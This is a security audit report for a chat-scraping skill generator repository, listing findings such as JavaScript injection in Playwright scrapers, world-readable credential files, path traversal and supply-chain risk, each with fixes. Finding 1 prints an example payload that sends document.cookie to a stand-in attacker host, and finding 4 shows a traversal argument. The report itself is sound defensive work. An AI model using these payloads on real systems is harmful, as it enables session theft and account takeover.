# Security Review — dot-skill (colleague-skill-wtf)

- **Branch reviewed:** `claude/security-review-pPFnU`
- **Date:** 2026-04-26
- **Scope:** `tools/`, `tests/`, `.github/workflows/`, `requirements.txt`
- **Out of scope:** generated `skills/*` artifacts, vendored references, the PDF binary

This review focuses on real, exploitable issues in the code that ships in the repo. Findings are ordered by severity. Each entry lists the file:line, what the bug is, how to trigger it, the impact, and a concrete fix referencing existing utilities where available.

## Severity schema

- **HIGH** — exploitable with realistic preconditions (local user, crafted input, or a compromised dependency in scope).
- **MEDIUM** — defense-in-depth gap; exploitation requires chaining or unusual configuration.
- **LOW** — hygiene / future-proofing; should be fixed but not blocking.
- **INFO** — verified-clean pattern, recorded so this surface does not get re-reviewed unnecessarily.

## Summary

| # | Sev | Title | Location |
|---|-----|---|---|
| 1 | HIGH | JS string-literal injection in Playwright `page.evaluate` (Feishu) | `tools/feishu_browser.py:227` |
| 2 | HIGH | JS string-literal injection in Playwright `page.evaluate` (DingTalk) | `tools/dingtalk_auto_collector.py:595` |
| 3 | HIGH | Credentials written world-readable (umask 0644) | 4 sites — see finding |
| 4 | MEDIUM | Path traversal via unsanitized `--slug` | `tools/skill_writer.py:593, 611-613` |
| 5 | MEDIUM | Supply-chain: `npx -y feishu-mcp` auto-installs unpinned npm package | `tools/feishu_mcp_client.py:115-122` |
| 6 | LOW | CI lint is non-blocking (`ruff … \|\| true`) | `.github/workflows/ci.yml:54` |
| 7 | LOW | Unpinned `yt-dlp` fed attacker-controllable URL | `tools/research/transcribe_audio.py:50-77` |
| 8 | LOW | No JSON schema validation on external API responses | Feishu/Slack/DingTalk collectors |
| 9 | INFO | No `eval` / `exec` / `shell=True` / `os.system` / `pickle.loads` / `yaml.load` / lxml-XXE / `verify=False` usages found | repo-wide grep |

---

## 1. HIGH — JavaScript string-literal injection in Feishu browser scraper

**Location:** `tools/feishu_browser.py:227-261`

```python
messages = page.evaluate(f"""
    () => {{
        const target = "{target_name}";
        ...
    }}
""")
```

`target_name` is the colleague's name passed in from the CLI (`fetch_messages(page, chat_name, target_name, ...)`, called by other collectors). It is interpolated raw into a JavaScript string literal inside `page.evaluate`.

**Trigger.** A user who controls the `--name` / target-name argument (or any caller that feeds a name read from disk, an LLM, or an upstream API) supplies a value containing a double quote, backslash, newline, or `</script>`-style break. Examples:

- `target_name = '"); fetch("http://attacker/x?c=" + document.cookie); //'` — breaks out of the literal and runs arbitrary JS in the Feishu page context, with full access to the authenticated session.
- `target_name = '\\";process.exit();//'` — same class of break.

**Impact.** Arbitrary JS in the authenticated Feishu web context: read messages, exfiltrate session tokens / cookies, post messages as the user, navigate to attacker-controlled pages. Effectively account takeover for the duration of the browser session.

**Fix.** Use Playwright's positional-argument form, which serializes the value safely:

```python
messages = page.evaluate(
    """(target) => {
        const results = [];
        ...
    }""",
    target_name,
)
```

The same pattern should be applied at `tools/feishu_browser.py:217` (`page.evaluate("el => el.scrollTop = 0", messages_container)` is already correct — use that style throughout).

---

## 2. HIGH — JavaScript string-literal injection in DingTalk browser scraper

**Location:** `tools/dingtalk_auto_collector.py:595-632`

```python
raw_messages = page.evaluate(f"""
    () => {{
        const target = "{name}";
        ...
        return results.slice(-{msg_limit});
    }}
""")
```

Same vulnerability class as finding #1: `name` is interpolated unescaped into a JS string literal. `msg_limit` is also interpolated as a number; argparse coerces `--msg-limit` to `int`, so it is type-safe today, but the pattern is still fragile.

**Impact.** Identical to finding #1, but in the DingTalk web context.

**Fix.** Switch to the positional-arg form:

```python
raw_messages = page.evaluate(
    """({ target, msgLimit }) => {
        ...
        return results.slice(-msgLimit);
    }""",
    {"target": name, "msgLimit": msg_limit},
)
```

---

## 3. HIGH — Credentials written world-readable

**Locations (all use `Path.write_text(json.dumps(config, ...))` with the default umask):**

- `tools/feishu_auto_collector.py:74` → `~/.colleague-skill/feishu_config.json` (App ID, App Secret, optional `user_access_token`)
- `tools/feishu_mcp_client.py:58` → same file (App ID, App Secret, optional `user_token`)
- `tools/slack_auto_collector.py:104` → `~/.colleague-skill/slack_config.json` (Bot User OAuth Token, `xoxb-…`)
- `tools/dingtalk_auto_collector.py:60` → `~/.colleague-skill/dingtalk_config.json` (App Key, App Secret)

`Path.write_text` honors the process umask, which on most distros yields mode `0644` — i.e. readable by every local user. These files contain long-lived secrets that grant API access to private chats, documents, and message history.

**Impact.** Any local user (or any process running as another UID — e.g. a compromised daemon) can read the secrets and impersonate the bot/app/user against Feishu, Slack, or DingTalk. On shared dev machines, in CI runners with multi-tenant fan-out, or after a separate low-privilege compromise, this is a straight path to account takeover.

**Fix.** Write the file at mode `0600` and tighten the parent directory at creation time:

```python
def save_config(config: dict) -> None:
    CONFIG_PATH.parent.mkdir(parents=True, exist_ok=True, mode=0o700)
    # Force 0600 even if the file already exists.
    fd = os.open(
        CONFIG_PATH,
        os.O_WRONLY | os.O_CREAT | os.O_TRUNC,
        0o600,
    )
    with os.fdopen(fd, "w", encoding="utf-8") as f:
        json.dump(config, f, indent=2, ensure_ascii=False)
    CONFIG_PATH.chmod(0o600)  # tighten if pre-existing
```

Apply identically to all four call sites. Consider migrating to OS keychains (`keyring` package) as a follow-up.

---

## 4. MEDIUM — Path traversal via unsanitized `--slug`

**Location:** `tools/skill_writer.py:593, 611-613` (and `create_skill` at `:226-250`)

```python
slug = args.slug or slugify(meta.get("display_name", meta.get("name", "colleague")))
...
base_dir = resolve_existing_storage_root(requested_character, slug=slug, base_dir_arg=args.base_dir)
skill_dir = base_dir / slug
```

`slugify()` (`tools/skill_writer.py:111-131`) sanitizes auto-derived names, but when `--slug` is supplied directly its value is **not** passed through `slugify()`. `resolve_existing_storage_root` (`tools/skill_presets.py:265-287`) does not normalize either — it just checks `(canonical / slug).exists()` and returns the base. The path is then used to call `skill_dir.mkdir(parents=True, exist_ok=True)` and write artifacts into it.

**Trigger.** Invoking `python3 tools/skill_writer.py --action create --slug ../../tmp/pwned --name foo` writes `meta.json`, `manifest.json`, and the rendered SKILL.md (which contains attacker-influenced YAML frontmatter and markdown content) outside the configured storage root. With `--action update` the same path is taken at `:611-613`.

**Impact.** Local privilege boundary crossing if an unprivileged caller (e.g. an LLM-driven sub-agent invoking the writer with a hostile metadata payload) can supply `--slug`. The writer can drop attacker-controlled markdown into arbitrary writable directories — including `~/.claude/skills/...` or `~/.claude/commands/...` via `install_generated_hosts` (`tools/skill_writer.py:434-494`), turning this into a skill/command injection on the next Claude Code start.

**Fix.** Sanitize unconditionally and assert containment:

```python
slug = slugify(args.slug) if args.slug else slugify(meta.get("display_name", meta.get("name", "colleague")))
skill_dir = (base_dir / slug).resolve()
if not skill_dir.is_relative_to(base_dir.resolve()):
    raise SystemExit(f"error: refusing to write outside storage root: {skill_dir}")
```

`slugify()` already strips non-ASCII and collapses underscores; reusing it here is the lowest-friction fix.

---

## 5. MEDIUM — Supply-chain risk in `npx -y feishu-mcp`

**Location:** `tools/feishu_mcp_client.py:115-122`

```python
result = subprocess.run(
    ["npx", "-y", "feishu-mcp", "--stdio"],
    input=payload,
    capture_output=True,
    text=True,
    env=env,
    timeout=30,
)
```

`npx -y` accepts a takeover/typosquat of the `feishu-mcp` package without prompting. The subprocess is invoked with `FEISHU_APP_ID`, `FEISHU_APP_SECRET`, and (in user-token mode) `FEISHU_USER_ACCESS_TOKEN` in its environment, so a malicious version of the package immediately exfiltrates production credentials.

**Impact.** Any compromise of the `feishu-mcp` npm package — namespace takeover, maintainer credential theft, or a bad release — leads to full Feishu credential disclosure for every installation that runs the MCP client.

**Fix.**

1. Pin the version: `["npx", "-y", "feishu-mcp@1.2.3", "--stdio"]` and bump deliberately.
2. Document the expected package and (optionally) integrity hash in `INSTALL.md`.
3. For defense in depth, prefer requiring a pre-installed binary (`shutil.which("feishu-mcp")`) over `npx`'s on-demand fetch, and surface a clear setup error if it is missing.

---

## 6. LOW — CI lint is non-blocking

**Location:** `.github/workflows/ci.yml:54`

```yaml
- name: Run ruff (non-blocking for now)
  run: ruff check tools/ || true
```

The `|| true` swallows ruff failures. Any lint regressions — including security-adjacent patterns ruff catches (`S` rule family if enabled, dead-code that hides bugs, unused imports of `subprocess`/`yaml`) — pass CI silently.

**Fix.** Drop `|| true`. If there is currently noise, vendor a minimal ruff config (`ruff.toml`) that opts in to specific rules and treats violations as errors. Optionally add `bandit -r tools/ -ll` for a pure security pass.

---

## 7. LOW — `yt-dlp` fed attacker-controllable URL

**Location:** `tools/research/transcribe_audio.py:50-77`, `tools/research/download_subtitles.sh:14-29`

`yt-dlp` is invoked with the user-supplied `--url` as a list argument (no `shell=True`), so direct shell-command injection is not the concern here. The risks are:

- **Network reach.** `yt-dlp`'s extractor will issue requests to the URL's host. If the host is internal (`http://169.254.169.254/...`, intranet IPs) the tool will reach it from the runner. This is an SSRF surface for any caller that takes an external URL string.
- **Extractor RCE history.** `yt-dlp` has had occasional advisories where a crafted page can exploit the extractor (e.g. unsafe filename templates). Running it unpinned increases exposure.

**Fix.**

- Pin `yt-dlp>=2024.x,<…` in `requirements.txt` (currently absent — only listed as a runtime expectation).
- Add `--no-playlist --max-downloads 1` to the `cmd` list to bound the work, and consider `--restrict-filenames`.
- Document the SSRF caveat: do not feed user-supplied URLs from untrusted sources without an allow-list of hosts.

---

## 8. LOW — No JSON schema validation on external API responses

**Locations:** `tools/feishu_auto_collector.py`, `tools/slack_auto_collector.py`, `tools/dingtalk_auto_collector.py`, `tools/feishu_mcp_client.py:151-241`

API responses are parsed with `json.loads()` / `resp.json()` and indexed directly (`m.get("sender", {}).get("name", "")`, etc.) without validating shape. This is not a direct vulnerability, but an upstream API change or a man-in-the-middle on a misconfigured TLS path can cause `KeyError`/`TypeError` deep in the pipeline, and any text returned ends up written to the skill directory as paraphrase-seed material — which is then read back by an LLM later. Treat this as defensive hardening, not an active exploit.

**Fix.** Validate response shape at the boundary (small `pydantic` models or hand-written `assert isinstance(...)` guards), and reject unexpected types with a clear error rather than silently writing partial output.

---

## 9. INFO — Verified-clean patterns

Grepped repo-wide; no hits or no exploitable hits in `tools/` or `tests/`:

- `eval(`, `exec(`, `__import__(`, `compile(` (only `re.compile` matched — safe)
- `shell=True`, `os.system`, `subprocess.Popen` with shell strings
- `pickle.loads`, `yaml.load` without `SafeLoader`
- `xml.etree`, `xml.sax`, `lxml` — XML parsing path goes through Python's stdlib `email`/`mailbox` and a custom `html.parser.HTMLParser` (`tools/email_parser.py`), neither of which fetch external entities, so XXE is not in scope
- `zipfile`, `tarfile` — no archive extraction in repo
- `requests.*(verify=False)` — all HTTP calls use TLS verification

The two `subprocess.run` call sites (`tools/feishu_mcp_client.py:115`, `tools/research/transcribe_audio.py:72`) both pass list arguments and do not use `shell=True`; command-injection from CLI args is not directly possible. Their separate risks are captured in findings #5 and #7.

---

## Suggested follow-ups (not in this review)

- Run `pip-audit` / `safety` against the pinned `requirements.txt` once versions are tightened.
- Audit the prompt-template files under `prompts/` for prompt-injection sinks (LLM input is treated as data here, but a deeper review would map the trust boundary between user-supplied artifacts and the LLM).
- Review the WeChat SQLite ingestion path mentioned in `README.md` once it is implemented — SQLite + raw paths is a frequent traversal source.
- Re-check the `install_*_generated_skill.py` family on Windows: the slash-command shim path uses `Path.home() / ".claude" / "commands"` and writes a `{command_name}.md`. Consider validating that `command_name` cannot contain path separators (it currently flows from `meta.json` `combined_command`, which is generated, but the install path is symmetric to finding #4).
